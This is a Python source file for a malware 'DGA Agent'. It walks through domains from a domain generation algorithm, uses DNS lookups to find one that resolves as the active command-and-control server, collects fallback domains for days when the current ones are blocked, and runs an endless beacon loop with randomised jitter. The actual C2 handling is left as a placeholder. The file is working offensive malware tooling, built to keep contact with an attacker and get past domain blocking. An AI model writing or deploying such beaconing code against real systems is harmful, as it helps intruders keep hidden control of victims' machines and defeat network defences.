"""
DGA Agent - Agent-side DGA implementation
"""

import socket
import time
from datetime import datetime


class DGAAgent:
    """
    DGA Agent
    Uses DGA to find active C2 domains
    """
    
    def __init__(self, dga_generator, timeout=2, max_retries=3):
        """
        Initialize DGA Agent
        
        Args:
            dga_generator: DGAGenerator instance
            timeout (int): DNS lookup timeout in seconds
            max_retries (int): Maximum retry attempts per domain
        """
        self.dga = dga_generator
        self.current_domain = None
        self.timeout = timeout
        self.max_retries = max_retries
    
    def get_current_domain(self):
        """
        Get current active C2 domain from DGA
        
        Returns:
            str: Active domain or None if none found
        """
        # Generate today's domains
        domains = self.dga.generate_daily_domains(num_days=1, domains_per_day=10)[0]['domains']
        
        # Try each domain until one responds
        for domain in domains:
            if self.check_domain(domain):
                self.current_domain = domain
                return domain
        
        return None
    
    def check_domain(self, domain):
        """
        Check if domain is active
        
        Args:
            domain (str): Domain to check
        
        Returns:
            bool: True if domain resolves, False otherwise
        """
        for attempt in range(self.max_retries):
            try:
                socket.setdefaulttimeout(self.timeout)
                socket.gethostbyname(domain)
                return True
            except socket.gaierror:
                # Domain doesn't resolve
                if attempt < self.max_retries - 1:
                    time.sleep(1)
                continue
            except Exception:
                continue
        
        return False
    
    def beacon_with_dga(self):
        """
        Beacon using DGA-generated domains
        
        Returns:
            str: Active domain or None
        """
        domain = self.get_current_domain()
        
        if domain:
            print(f"[+] Active C2 domain: {domain}")
            return domain
        else:
            print(f"[-] No active C2 domains found")
            return None
    
    def get_fallback_domains(self, num_days=3):
        """
        Get fallback domains for multiple days
        Useful when current day's domains are all blocked
        
        Args:
            num_days (int): Number of days to check
        
        Returns:
            list: List of active domains
        """
        all_domains = self.dga.generate_daily_domains(num_days=num_days, domains_per_day=10)
        active_domains = []
        
        for day_data in all_domains:
            for domain in day_data['domains']:
                if self.check_domain(domain):
                    active_domains.append({
                        'domain': domain,
                        'date': day_data['date']
                    })
                    
                    # Only need one per day
                    break
        
        return active_domains
    
    def continuous_beacon(self, interval=300, jitter=60):
        """
        Continuously beacon using DGA domains
        
        Args:
            interval (int): Beacon interval in seconds
            jitter (int): Random jitter in seconds
        """
        import random
        
        print(f"[*] Starting continuous beacon")
        print(f"[*] Interval: {interval}s ± {jitter}s")
        
        while True:
            try:
                domain = self.beacon_with_dga()
                
                if domain:
                    # Beacon successful - use this domain for C2
                    # (Implement your C2 logic here)
                    pass
                
                # Sleep with jitter
                sleep_time = interval + random.randint(-jitter, jitter)
                time.sleep(max(1, sleep_time))
            
            except KeyboardInterrupt:
                print("\n[!] Beacon stopped")
                break
            except Exception as e:
                print(f"[-] Beacon error: {e}")
                time.sleep(60)